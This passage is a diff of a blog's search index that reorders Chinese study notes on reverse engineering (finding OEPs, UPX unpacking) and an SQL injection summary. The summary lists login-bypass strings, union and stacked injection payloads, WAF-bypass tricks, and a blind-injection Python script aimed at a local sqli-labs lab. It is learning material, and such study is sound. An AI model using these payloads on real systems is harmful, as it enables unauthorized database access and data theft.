@@ -45,60 +45,6 @@
       </tags>
   </entry>
   <entry>
-    <title>OEP入口查找和基本壳的识别</title>
-    <url>/2020/08/02/OEP%E5%85%A5%E5%8F%A3%E6%9F%A5%E6%89%BE%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%A3%B3%E7%9A%84%E8%AF%86%E5%88%AB/</url>
-    <content><![CDATA[<hr>
-<a id="more"></a>
-
-<h1 id="入口点的查找："><a href="#入口点的查找：" class="headerlink" title="入口点的查找："></a>入口点的查找：</h1><blockquote>
-<p>VC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。<br>特征：固定调用API<br>GetVersion;  GetCommandLineA;  GetStartupInfoA</p>
-</blockquote>
-<blockquote>
-<p>VS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。<br>特征：call + jmp指令<br>API：GetSystemTimeAsFlieTime;  GetCurrentThreadId;  GetCurrentProcessId;  QueryPerformanceCounter</p>
-</blockquote>
-<h1 id="脱壳基本方法"><a href="#脱壳基本方法" class="headerlink" title="脱壳基本方法"></a>脱壳基本方法</h1><p>1.单步跟踪</p>
-<p>2.平衡堆栈</p>
-<p>​    OEP的第一条指令是<code>pushad</code>，作用一般是保存寄存器环境，将8各通用寄存器压入堆栈；单步执行程序，指令<code>pushad</code>执行，堆栈变化，此时在栈顶（ESP）设置硬件断点；<br>​    运行，程序在<code>popad</code>附近停止，表示已经处在壳代码末尾，继续单步到一个较大的<code>jmp</code>跳转，目标应该是原始OEP。<br>​    观察代码是否确是原始OEP，可以参照上文不同情况入口点特征做判断。</p>
-<p>步骤：</p>
-<p>1.查找原始OEP</p>
-<p>​    确定原始程序代码的位置</p>
-<p>2.dump内存到文件</p>
-<p>​    内存中被还原的代码和数据抓取下来，重新保存成一个文件</p>
-<p>3.修复文件</p>
-<p>​    修复IAT，对从内存中转储到本地的文件进行修复</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/99750" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99750</a><br><a href="https://www.52pojie.cn/forum-68-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/forum-68-1.html</a><br><a href="https://www.52pojie.cn/thread-234739-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-234739-1-1.html</a><br><a href="https://zhuanlan.zhihu.com/p/34263050" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34263050</a><br><a href="https://www.cnblogs.com/iBinary/p/7764483.html" target="_blank" rel="noopener">https://www.cnblogs.com/iBinary/p/7764483.html</a></p>
-]]></content>
-      <categories>
-        <category>note</category>
-      </categories>
-      <tags>
-        <tag>Reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>OLLVM 控制流平坦化</title>
-    <url>/2020/09/13/OLLVM-%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/</url>
-    <content><![CDATA[<hr>
-]]></content>
-      <categories>
-        <category>note</category>
-      </categories>
-      <tags>
-        <tag>Reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PE Files (1)</title>
-    <url>/2020/07/22/PE-Files-1/</url>
-    <content><![CDATA[<a id="more"></a>]]></content>
-      <categories>
-        <category>note</category>
-      </categories>
-      <tags>
-        <tag>Reverse</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MD5算法详解 &amp; 哈希长度拓展攻击</title>
     <url>/2020/09/10/MD5-and-Hash-Length-Extension-Attack/</url>
     <content><![CDATA[<hr>
@@ -130,47 +76,9 @@
       </tags>
   </entry>
   <entry>
-    <title>UPX壳详解</title>
-    <url>/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/</url>
+    <title>OLLVM 控制流平坦化</title>
+    <url>/2020/09/13/OLLVM-%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/</url>
     <content><![CDATA[<hr>
-<a id="more"></a>
-
-<h1 id="UPX简介"><a href="#UPX简介" class="headerlink" title="UPX简介"></a>UPX简介</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPX (the Ultimate Packer for eXecutables)是一个著名的压缩壳,主要功能是压缩PE文件(比如exe,dll等文件),有时候也可能被病毒用于免杀。壳upx是一种保护程 序。一般是EXE文件的一种外保护措施，主要用途：</span><br><span class="line"></span><br><span class="line">1、让正规文件被保护起来，不容易被修改和破解。</span><br><span class="line"></span><br><span class="line">2、使文件压缩变小。</span><br><span class="line"></span><br><span class="line">3、保护杀毒软件安装程序，使之不受病毒侵害。</span><br><span class="line"></span><br><span class="line">4、木马，病毒的保护外壳，使之难以为攻破。</span><br><span class="line"></span><br><span class="line">利用特殊的算法，对EXE、DLL文件里的资源进行压缩。类似WINZIP 的效果，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，都在内存中完成。解压原理，是加壳工具在文件头里加了一段指令，告诉CPU，怎么才 能解压自己。当加壳时，其实就是给可执行的文件加上个外衣。用户执行的只是这个外壳程序。当执行这个程序的时候这个壳就会把原来的程序在内存中解开，解开 后，以后的就交给真正的程序。</span><br></pre></td></tr></table></figure>
-
-<h1 id="脱壳工具"><a href="#脱壳工具" class="headerlink" title="脱壳工具"></a>脱壳工具</h1><p>upx壳的官网是：<a href="https://upx.github.io/" target="_blank" rel="noopener">https://upx.github.io/</a><br>下载最新版的upx：<a href="https://github.com/upx/upx/releases/" target="_blank" rel="noopener">https://github.com/upx/upx/releases/</a> </p>
-<h1 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h1><p><strong>（“堆栈平衡”原理）</strong></p>
-<blockquote>
-<p>call指令：<br>  1.向堆栈中压入下一行程序的地址；<br>  2.JMP到call的子程序地址处。</p>
-</blockquote>
-<blockquote>
-<p>RETN指令：<br>  1.将当前的ESP中指向的地址出栈；<br>  2.JMP到这个地址。这个就完成了一次调用子程序的过程</p>
-</blockquote>
-<blockquote>
-<p>如果我们要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RETN这条指令之前，ESP指向的是我们压入栈中的地址。</p>
-</blockquote>
-<blockquote>
-<p>在程序自解密或者自解压过程中, 多数壳会先将当前寄存器状态压栈, 如使用pushad, 而在解压结束后, 会将之前的寄存器值出栈, 如使用popad. 因此在寄存器出栈时, 往往程序代码被恢复, 此时硬件断点触发（这就是我们要下硬件断点的原因），然后在程序当前位置, 只需要一些单步操作, 就会到达正确的OEP位置</p>
-</blockquote>
-<p><strong>载入程序后只有esp寄存器内容发生变化，那么这个程序多半可以用ESP定律(存疑)</strong></p>
-<h1 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h1><h2 id="脱壳三步法"><a href="#脱壳三步法" class="headerlink" title="脱壳三步法"></a>脱壳三步法</h2><blockquote>
-<p>① 寻找原始OEP<br>这一步骤的主要作用就是要确定原始程序代码到底在哪里，能找到原始程序的代码，说明壳代码执行完了，我们只有找到原始OEP才能进行下一步的动作。</p>
-<p>② dump内存到文件<br>当我们找到原始OEP，调试运行到原始OEP时，只要代码被还原，我们就可以在这个地方进行dump内存，将内存中被还原的代码和数据抓取下来，重新保存成一个文件，这样脱完壳时，我们就可以用静态分析工具分析程序了。</p>
-<p>③ 修复文件<br>这一步主要就是修复IAT，对从内存中转储到本地的文件进行修复。</p>
-</blockquote>
-<h2 id="示例：BUUCTF-Reverse-新年快乐"><a href="#示例：BUUCTF-Reverse-新年快乐" class="headerlink" title="示例：BUUCTF_Reverse_新年快乐"></a>示例：BUUCTF_Reverse_新年快乐</h2><p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803160918611.png" alt="image-20200803160918611"></p>
-<p>使用ExeinfoPE查壳，确认是UPX</p>
-<p>x32dbg打开，寻找原始OEP</p>
-<p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803161135150.png" alt="image-20200803161135150"></p>
-<p>不需要下ESP硬件断点，F9运行，可以看到popad在上方</p>
-<p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803161244521.png" alt="image-20200803161244521"></p>
-<p>有一系列jmp指令，选择跳转较远的，地址00401280，一般就是原始OEP，可以下一个断电F9运行，确认是原始OEP</p>
-<p>使用Scylla插件，Dump，自动寻找IAT，获取导入表，修复Dump文件</p>
-<p>IDA打开脱壳文件，确认成功</p>
-<p>注：原始OEP也可以通过逐条分析汇编指令寻找，难度较大；有经验的话可以直接搜索popad</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918</a></p>
-<p><a href="https://www.anquanke.com/post/id/99750" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99750</a></p>
-<p><a href="https://blog.csdn.net/qq_42967398/article/details/96444954" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/96444954</a></p>
-<p><a href="https://baijiahao.baidu.com/s?id=1662196196423030806&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1662196196423030806&amp;wfr=spider&amp;for=pc</a></p>
 ]]></content>
       <categories>
         <category>note</category>
@@ -180,56 +88,45 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL注入总结</title>
-    <url>/2020/07/29/SQL%E6%B3%A8%E5%85%A5/</url>
+    <title>OEP入口查找和基本壳的识别</title>
+    <url>/2020/08/02/OEP%E5%85%A5%E5%8F%A3%E6%9F%A5%E6%89%BE%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%A3%B3%E7%9A%84%E8%AF%86%E5%88%AB/</url>
     <content><![CDATA[<hr>
 <a id="more"></a>
 
-<h1 id="常规操作流程"><a href="#常规操作流程" class="headerlink" title="常规操作流程"></a>常规操作流程</h1><p>1.测试有多少字段<br>2.爆出数据库名<br>3.爆出数据库里的表<br>4.爆出表的列名<br>5.爆出所有数据</p>
-<h1 id="常见注入方法："><a href="#常见注入方法：" class="headerlink" title="常见注入方法："></a>常见注入方法：</h1><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or &#39;1&#39;&#x3D;&#39;1	&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39; or &#39;1&#39;&#x3D;&#39;1&#39;</span><br><span class="line">&#39; or 1&#x3D;1#	&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39; or 1&#x3D;1#&#39;</span><br><span class="line">&#39;&#x3D;0#		&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39;&#x3D;0#</span><br></pre></td></tr></table></figure>
-
-<h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xx&#39; union select 1,(select database()) #</span><br><span class="line">xx&#39; union select (select database()),2 or &#39;</span><br></pre></td></tr></table></figure>
-
-<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br><span class="line">1&#39;;show tables from supersqli;#</span><br><span class="line">1&#39;;show columns from __;</span><br></pre></td></tr></table></figure>
-
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据<br>常用函数：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Length()		<span class="comment">//函数 返回字符串的长度</span></span><br><span class="line">Substr()		<span class="comment">//截取字符串</span></span><br><span class="line">Ascii()			<span class="comment">//返回字符的ascii码</span></span><br><span class="line">sleep(n)		<span class="comment">//将程序挂起一段时间 n为n秒</span></span><br><span class="line"><span class="keyword">if</span>(expr1,expr2,expr3)	<span class="comment">//判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span></span><br></pre></td></tr></table></figure>
-
-<p>脚本模板：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">r'2014-11-16'</span>) <span class="comment">#此处是关键字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">'user()'</span></span><br><span class="line">        request = urllib2.Request(<span class="string">''</span>)</span><br><span class="line">                <span class="comment">#其中单引号中放注入的url</span></span><br><span class="line">        request.add_header(<span class="string">'User-Agent'</span>,<span class="string">''</span>)</span><br><span class="line">                <span class="comment">#其中单引号中放User-Agent对应的东东！</span></span><br><span class="line">        response = urllib2.urlopen(request)</span><br><span class="line">        <span class="comment">#print character</span></span><br><span class="line">        match = pattern.search(response.read())</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">if</span> character == <span class="number">0</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'%d -- %s'</span>%(count,chr(character))</span><br><span class="line">                <span class="comment">#print match.group()</span></span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p>爆数据库：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_len</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		url = <span class="string">'''http://127.0.0.1/sqli-labs-master/Less-8/index.php'''</span></span><br><span class="line">		payload = <span class="string">'''?id=1' and length(database())&gt;%s'''</span> %i</span><br><span class="line">		<span class="comment"># print(url+payload+'%23')</span></span><br><span class="line">		r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(i)</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print('false')</span></span><br><span class="line">			print(<span class="string">'database_length:'</span>,i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">database_len()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span><span class="params">()</span>:</span></span><br><span class="line">	name = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'sqcwertyuioplkjhgfdazxvbnm'</span>:</span><br><span class="line">			url = <span class="string">"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			<span class="comment"># print(url+'%23')</span></span><br><span class="line">			r = requests.get(url+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				</span><br><span class="line">				print(name)</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">'database_name:'</span>,name)</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure>
-<h1 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h1><h2 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 注释内容</span><br><span class="line"># 注释内容</span><br><span class="line">&#x2F;*注释内容*&#x2F;</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>
-
-<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><blockquote>
-<p>某些关键字可能被过滤，利用sql语句对大小写不敏感的特点，可以任意变换关键字大小写来绕过过滤；</p>
+<h1 id="入口点的查找："><a href="#入口点的查找：" class="headerlink" title="入口点的查找："></a>入口点的查找：</h1><blockquote>
+<p>VC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。<br>特征：固定调用API<br>GetVersion;  GetCommandLineA;  GetStartupInfoA</p>
 </blockquote>
-<h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><blockquote>
-<p>内联注释就是把一些特有的仅在MYSQL上的语句放在<code>/*...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
+<blockquote>
+<p>VS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。<br>特征：call + jmp指令<br>API：GetSystemTimeAsFlieTime;  GetCurrentThreadId;  GetCurrentProcessId;  QueryPerformanceCounter</p>
 </blockquote>
-<h2 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h2><blockquote>
-<p>在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求</p>
-</blockquote>
-<h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**&#x2F;</span><br><span class="line">()</span><br><span class="line">\n(%0a)</span><br><span class="line">&#96;(grave)</span><br><span class="line">tab(%09)</span><br></pre></td></tr></table></figure>
-
-<h2 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and &#x3D; &amp;&amp;</span><br><span class="line">or &#x3D; ||</span><br><span class="line">xor &#x3D; ^</span><br><span class="line">not &#x3D; !</span><br></pre></td></tr></table></figure>
-<h2 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号=绕过"></a>过滤等号=绕过</h2><blockquote>
-<p>1.不加通配符的like执行的效果和=一致，所以可以用来绕过<br>2.rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样<br>3.regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配<br>4.使用大小于号来绕过<br>5.&lt;&gt; 等价于 !=，所以在前面再加一个!结果就是等号了<br>6.等号绕过也可以使用strcmp(str1,str2)函数、between关键字等</p>
-</blockquote>
-<h2 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h2><p><code>from pos for len</code></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="string">"string"</span>,<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="string">"string"</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">3</span>);</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
-
-<h2 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h2><blockquote>
-<p>sleep() –&gt;benchmark()<br>ascii()–&gt;hex()、bin()<br>group_concat()–&gt;concat_ws()<br>substr(),substring(),mid()<br>user() –&gt; @@user、datadir–&gt;@@datadir<br>ord()–&gt;ascii()</p>
-</blockquote>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82995313</a><br><a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40709439/article/details/81355856</a><br><a href="https://www.dazhuanlan.com/2019/12/09/5dee2bf66bd36/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/12/09/5dee2bf66bd36/</a><br><a href="https://xz.aliyun.com/t/7169" target="_blank" rel="noopener">https://xz.aliyun.com/t/7169</a></p>
+<h1 id="脱壳基本方法"><a href="#脱壳基本方法" class="headerlink" title="脱壳基本方法"></a>脱壳基本方法</h1><p>1.单步跟踪</p>
+<p>2.平衡堆栈</p>
+<p>​    OEP的第一条指令是<code>pushad</code>，作用一般是保存寄存器环境，将8各通用寄存器压入堆栈；单步执行程序，指令<code>pushad</code>执行，堆栈变化，此时在栈顶（ESP）设置硬件断点；<br>​    运行，程序在<code>popad</code>附近停止，表示已经处在壳代码末尾，继续单步到一个较大的<code>jmp</code>跳转，目标应该是原始OEP。<br>​    观察代码是否确是原始OEP，可以参照上文不同情况入口点特征做判断。</p>
+<p>步骤：</p>
+<p>1.查找原始OEP</p>
+<p>​    确定原始程序代码的位置</p>
+<p>2.dump内存到文件</p>
+<p>​    内存中被还原的代码和数据抓取下来，重新保存成一个文件</p>
+<p>3.修复文件</p>
+<p>​    修复IAT，对从内存中转储到本地的文件进行修复</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/99750" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99750</a><br><a href="https://www.52pojie.cn/forum-68-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/forum-68-1.html</a><br><a href="https://www.52pojie.cn/thread-234739-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-234739-1-1.html</a><br><a href="https://zhuanlan.zhihu.com/p/34263050" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34263050</a><br><a href="https://www.cnblogs.com/iBinary/p/7764483.html" target="_blank" rel="noopener">https://www.cnblogs.com/iBinary/p/7764483.html</a></p>
 ]]></content>
       <categories>
         <category>note</category>
       </categories>
       <tags>
-        <tag>CTF - Web</tag>
+        <tag>Reverse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PE Files (1)</title>
+    <url>/2020/07/22/PE-Files-1/</url>
+    <content><![CDATA[<a id="more"></a>]]></content>
+      <categories>
+        <category>note</category>
+      </categories>
+      <tags>
+        <tag>Reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -390,6 +287,109 @@
       </tags>
   </entry>
   <entry>
+    <title>SQL注入总结</title>
+    <url>/2020/07/29/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+
+<h1 id="常规操作流程"><a href="#常规操作流程" class="headerlink" title="常规操作流程"></a>常规操作流程</h1><p>1.测试有多少字段<br>2.爆出数据库名<br>3.爆出数据库里的表<br>4.爆出表的列名<br>5.爆出所有数据</p>
+<h1 id="常见注入方法："><a href="#常见注入方法：" class="headerlink" title="常见注入方法："></a>常见注入方法：</h1><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or &#39;1&#39;&#x3D;&#39;1	&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39; or &#39;1&#39;&#x3D;&#39;1&#39;</span><br><span class="line">&#39; or 1&#x3D;1#	&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39; or 1&#x3D;1#&#39;</span><br><span class="line">&#39;&#x3D;0#		&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39;&#x3D;0#</span><br></pre></td></tr></table></figure>
+
+<h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xx&#39; union select 1,(select database()) #</span><br><span class="line">xx&#39; union select (select database()),2 or &#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br><span class="line">1&#39;;show tables from supersqli;#</span><br><span class="line">1&#39;;show columns from __;</span><br></pre></td></tr></table></figure>
+
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据<br>常用函数：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Length()		<span class="comment">//函数 返回字符串的长度</span></span><br><span class="line">Substr()		<span class="comment">//截取字符串</span></span><br><span class="line">Ascii()			<span class="comment">//返回字符的ascii码</span></span><br><span class="line">sleep(n)		<span class="comment">//将程序挂起一段时间 n为n秒</span></span><br><span class="line"><span class="keyword">if</span>(expr1,expr2,expr3)	<span class="comment">//判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span></span><br></pre></td></tr></table></figure>
+
+<p>脚本模板：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">r'2014-11-16'</span>) <span class="comment">#此处是关键字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">'user()'</span></span><br><span class="line">        request = urllib2.Request(<span class="string">''</span>)</span><br><span class="line">                <span class="comment">#其中单引号中放注入的url</span></span><br><span class="line">        request.add_header(<span class="string">'User-Agent'</span>,<span class="string">''</span>)</span><br><span class="line">                <span class="comment">#其中单引号中放User-Agent对应的东东！</span></span><br><span class="line">        response = urllib2.urlopen(request)</span><br><span class="line">        <span class="comment">#print character</span></span><br><span class="line">        match = pattern.search(response.read())</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">if</span> character == <span class="number">0</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'%d -- %s'</span>%(count,chr(character))</span><br><span class="line">                <span class="comment">#print match.group()</span></span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>爆数据库：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_len</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		url = <span class="string">'''http://127.0.0.1/sqli-labs-master/Less-8/index.php'''</span></span><br><span class="line">		payload = <span class="string">'''?id=1' and length(database())&gt;%s'''</span> %i</span><br><span class="line">		<span class="comment"># print(url+payload+'%23')</span></span><br><span class="line">		r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(i)</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print('false')</span></span><br><span class="line">			print(<span class="string">'database_length:'</span>,i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">database_len()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span><span class="params">()</span>:</span></span><br><span class="line">	name = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'sqcwertyuioplkjhgfdazxvbnm'</span>:</span><br><span class="line">			url = <span class="string">"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'"</span> 